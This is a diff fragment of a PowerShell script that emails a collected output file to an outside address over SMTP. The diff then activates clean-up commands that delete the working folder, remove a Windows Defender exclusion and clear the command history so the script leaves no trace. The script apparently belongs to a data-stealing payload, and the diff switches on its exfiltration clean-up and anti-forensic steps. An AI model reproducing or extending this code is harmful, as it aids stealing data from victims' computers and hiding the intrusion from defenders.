@@ -110,12 +110,12 @@ $Body = "Hi, here is the Rapport"
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl
 
 # Clean up
-#Remove-Item -Path $dir -Recurse -Force
+Remove-Item -Path $dir -Recurse -Force
 #Set-MpPreference -DisableRealtimeMonitoring $false
-#Remove-MpPreference -ExclusionPath $dir
+Remove-MpPreference -ExclusionPath $dir
 
 # Remove the script from the system
-#Clear-History
+Clear-History
 
 # Reboot the system
 #Restart-Computer -Force
